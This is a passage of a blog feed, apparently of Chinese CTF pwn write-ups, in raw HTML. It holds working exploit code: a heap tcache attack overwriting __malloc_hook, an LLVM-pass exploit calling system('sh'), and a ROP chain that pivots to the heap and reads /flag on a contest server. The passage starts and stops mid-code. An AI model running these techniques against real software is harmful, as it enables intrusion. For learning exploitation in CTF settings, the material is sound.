string">b':'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebda0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27/libc-2.27.so'</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseogg <span class="token operator">=</span> <span class="token number">0x10a2fc</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> <span class="token string">b'\x61'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span>edit<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="show-me-the-code"><a href="#show-me-the-code" class="headerlink" title="show_me_the_code"></a>show_me_the_code</h3><p><code>llvm</code>，用<code>c++</code>写<code>exp</code>，由于<code>opt-12</code>保护机制是<code>no pie</code>所以可以获取其中的<code>got</code>表里的<code>libc</code>地址，直接打<code>system(&#39;sh&#39;)</code></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">edoc</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">void</span> <span class="token function">addi</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                                 <span class="token comment">//regs[x] = y + z                                                       x &lt;= 5</span>    <span class="token keyword">void</span> <span class="token function">chgr</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                                        <span class="token comment">//regs[x] += y                                                          x &lt;= 5                  -0x1000 &lt; y &lt; 0x1000    onetime</span>    <span class="token keyword">void</span> <span class="token function">sftr</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">bool</span> y<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                      <span class="token comment">//y = 1 : regs[x] &lt;&lt; z;         y = 0 : regs[x] >> z                    x &lt;= 5  y &lt; 0x40</span>    <span class="token keyword">void</span> <span class="token function">borr</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> y<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>             <span class="token comment">//regs[x] = regs[y] | regs[z]                                           x &lt;= 5  y &lt;= 5  z &lt;= 5</span>    <span class="token keyword">void</span> <span class="token function">movr</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                              <span class="token comment">//regs[x] = regs[y]                                                     x &lt; 8  y &lt; 8</span>    <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span>  y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                              <span class="token comment">//*(y+regs[6]) = regs[x]                                                x &lt;= 5  y &lt;= 0x1000     y &amp; 7 == 0      regs[6] &amp; 0xFFF = 0     regs[7] = regs[6] + 0x1000</span>    <span class="token keyword">void</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                               <span class="token comment">//regs[x] = *(y+regs[6])                                                x &lt;= 5  y &lt;= 0x1000     y &amp; 7 == 0      regs[6] &amp; 0xFFF = 0     regs[7] = regs[6] + 0x1000</span>    <span class="token keyword">void</span> <span class="token function">runc</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span>  y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                              <span class="token comment">//*(y+regs[6])(regs[x])                                                 x &lt;= 5  y &lt;= 0x1000     y &amp; 7 == 0      regs[6] &amp; 0xFFF = 0     regs[7] = regs[6] + 0x1000</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>edoc obj<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">c0deVmMain</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        obj<span class="token punctuation">.</span><span class="token function">addi</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x442000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//getenv_got</span>        obj<span class="token punctuation">.</span><span class="token function">movr</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">addi</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x443000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">movr</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xad8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//2 -> getenv_addr</span>        obj<span class="token punctuation">.</span><span class="token function">sftr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">sftr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">addi</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">borr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">chgr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xc00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">sftr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">addi</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x3024</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">addi</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xd70</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">borr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xb00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">runc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xb00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;round1&quot;&gt;&lt;a href=&quot;#round1&quot; class=&quot;headerlink&quot; title=&quot;round1&quot;&gt;&lt;/a&gt;round1&lt;/h2&gt;&lt;h3 id=&quot;canary-orw&quot;&gt;&lt;a href=&quot;#canary-orw&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2024强网拟态初赛pwn方向wp</title>
    <link href="https://starrysky1004.github.io/2024/10/21/2024-qiang-wang-ni-tai-chu-sai-pwn-fang-xiang-wp/2024-qiang-wang-ni-tai-chu-sai-pwn-fang-xiang-wp/"/>
    <id>https://starrysky1004.github.io/2024/10/21/2024-qiang-wang-ni-tai-chu-sai-pwn-fang-xiang-wp/2024-qiang-wang-ni-tai-chu-sai-pwn-fang-xiang-wp/</id>
    <published>2024-10-21T13:02:21.000Z</published>
    <updated>2024-10-21T13:09:26.846Z</updated>
    
    <content type="html"><![CDATA[<p>题目：<a href="https://github.com/0xviol1t/CTF-challenges/tree/main/2024/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/pwn">https://github.com/0xviol1t/CTF-challenges/tree/main/2024/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/pwn</a></p><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>覆盖种子为<code>0</code>之后进行伪随机数绕过，栈迁移到堆上进行<code>orw</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn-4a001b90aa.challenge.xctf.org.cn"</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401893</span>heap <span class="token operator">=</span> <span class="token number">0x4040E0</span>start <span class="token operator">=</span> <span class="token number">0x4011B0</span>c_libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> heapCtx<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Note: '</span><span class="token punctuation">,</span> heapCtx<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">auth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    seed <span class="token operator">=</span> <span class="token number">0</span>    c_libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>    p <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x12</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        num <span class="token operator">=</span> c_libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span>        r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'code'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>auth<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>auth<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>auth<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>rax <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rax'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baserdi <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdi'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basersi <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rsi'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baserdx <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdx'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesyscall <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'syscall'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseleave_ret <span class="token operator">=</span> <span class="token number">0x00000000004013be</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>flag <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0x220</span> <span class="token operator">+</span> <span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">0x10</span>code <span class="token operator">=</span> <span class="token number">0x404e00</span>orw_rop <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'openat'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> <span class="token string">b'/flag'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> orw_rop<span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x100</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr <span class="token operator">+</span> <span class="token number">0x220</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token 